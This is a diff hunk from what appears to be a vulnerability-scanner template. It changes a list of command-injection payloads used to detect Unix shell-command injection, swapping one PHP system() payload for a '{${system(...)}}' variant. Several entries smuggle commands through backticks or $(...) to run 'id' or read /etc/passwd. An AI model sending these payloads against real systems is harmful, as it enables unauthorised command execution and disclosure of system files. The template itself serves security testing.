@@ -51,7 +51,7 @@ requests:
 
         # Common shell commands for discovery (unix)
         - "1;system('id')"
-        - "1;system('cat /etc/passwd')"
+        - "{${system("cat+/etc/passwd")}}"
         - "test`id`"
         - "test`cat /etc/passwd`"
         - "test$(cat /etc/passwd)"
